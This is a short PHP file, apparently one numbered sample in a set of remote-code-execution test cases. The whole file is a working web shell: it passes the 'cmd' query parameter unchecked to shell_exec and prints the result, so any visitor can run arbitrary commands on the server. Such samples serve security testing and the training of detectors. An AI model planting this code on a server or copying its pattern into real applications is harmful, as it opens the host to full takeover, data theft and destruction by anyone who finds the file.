<?php
// RCE test variation #759
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>